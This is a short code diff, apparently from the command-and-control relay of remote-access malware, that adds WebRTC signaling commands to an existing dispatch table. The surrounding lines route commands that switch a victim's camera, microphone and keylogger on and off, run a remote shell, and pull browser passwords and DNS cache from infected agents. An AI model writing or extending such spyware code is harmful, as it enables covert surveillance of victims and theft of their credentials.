@@ -474,7 +474,8 @@ def on_command(data):
 # Simple hub→agent forwards (no req/resp, no response routed back)
 for _cmd in ("camera_on", "camera_off", "mic_on", "mic_off",
              "keylog_on", "keylog_off",
-             "shell_start", "shell_input", "shell_stop"):
+             "shell_start", "shell_input", "shell_stop",
+             "webrtc_answer", "webrtc_stop"):
     def _make_cmd_handler(ev):
         def _h(data):
             _to_agent(data, ev)
@@ -694,6 +695,8 @@ for _rr in [
     ("get_dns_cache",          "dns_cache_result"),
     ("get_browser_passwords",  "browser_passwords_result"),
     ("force_update",           "force_update_result"),
+    # WebRTC signaling: hub requests offer, agent responds with SDP offer
+    ("webrtc_request",         "webrtc_offer"),
 ]:
     _make_req_resp(*_rr)
 
